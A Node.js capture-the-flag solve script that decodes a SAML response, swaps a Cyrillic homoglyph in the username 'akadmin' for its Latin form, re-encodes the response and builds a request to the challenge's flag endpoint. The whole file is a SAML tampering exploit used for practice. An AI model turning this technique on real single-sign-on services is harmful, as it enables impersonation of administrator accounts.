const zlib = require('zlib');

// Get SAML response from command line
const samlB64 = process.argv[2];

if (!samlB64) {
    console.log('Usage: node modify_saml.js <base64_saml_response>');
    process.exit(1);
}

// Decode
const xmlString = zlib.inflateRawSync(Buffer.from(samlB64, 'base64')).toString();

console.log('Original SAML:\n' + xmlString);
console.log('\n---\n');

// Replace Cyrillic а with Latin a in username
const modified = xmlString.replace(/аkadmin/g, 'akadmin');

console.log('Modified SAML:\n' + modified);
console.log('\n---\n');

// Re-encode
const modifiedB64 = zlib.deflateRawSync(Buffer.from(modified)).toString('base64');

console.log('Modified Base64 SAMLResponse:');
console.log(modifiedB64);
console.log('\n---\n');

console.log('Full URL:');
console.log(`https://saml-web.challs.infobahnc.tf/flag?SAMLResponse=${encodeURIComponent(modifiedB64)}`);
